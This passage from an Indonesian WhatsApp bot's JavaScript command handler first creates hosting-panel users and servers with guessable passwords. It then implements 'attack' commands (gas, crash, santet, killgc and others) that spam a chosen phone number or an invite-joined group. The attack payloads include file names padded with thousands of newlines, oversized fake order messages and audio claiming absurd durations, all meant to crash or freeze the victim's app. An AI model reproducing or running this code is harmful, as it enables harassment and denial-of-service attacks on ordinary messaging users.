let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2e901b7a8897c9b9fef65.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "200"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2e901b7a8897c9b9fef65.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2e901b7a8897c9b9fef65.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/838a085cfb3348892e76d.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
// ATTACK NUMBER
case "gas": case "kill": case "crash":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "Yanzz Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "Yanzz Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzofc`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "shoot": case "bugkuy":  case "duarr":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "Yanzz Bug🔥`", fileName: `Yanzz Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE ZIRO-MD`", fileName: `Yanzz Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "killyou": case "doblekill": case "triplekill":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "Yanzz Bug🔥", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "Yanzz Bug🔥", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "savage": case "santet": case "danger":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(prrkek, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube Yanzz`",
"message": `${button}`,
"sellerJid": "6285786539008@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: prrkek, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "meninggal": case "headshot": case "mati":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtu.be/ZlabLFVCFms", 
"sourceUrl": "https://youtu.be/ZlabLFVCFms" }}}, { quoted: m })
}
break
// LAST DI ATAS
// ATTACK GROUP V1 ( PAKE LINK GROUP )
case "killgc": case "santetgc": case "gcwakwaw": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { text: "Yanzz Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(mnm, { text: "Yanzz Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [mnm],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb Yanzz", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://instagram.com/fahrul_mt", 
"sourceUrl": "https://instagram.com/fahrul_mt" }}}, { quoted: m })
}
break
case "togc": case "matigc": case "kuygc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!q) return reply(`Contoh ${prefix+command} linkgc|jumlah`)
if (!isUrl(q.split("|")[0]) && !q.split("|")[0].includes("whatsapp.com")) return reply("Link Invalid!")
let fhehfhe = q.split("|")[0].split("https://chat.whatsapp.com/")[1]
let mnm = await Biiofc.groupAcceptInvite(fhehfhe)
await reply(mess.wait)
global.jumlah = q.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { document: thumb, caption: "YOUTUBE Yanzz", fileName: `Bii ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(mnm, { document: thumb, caption: "YOUTUBE Yanzz", fileName: `BII ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n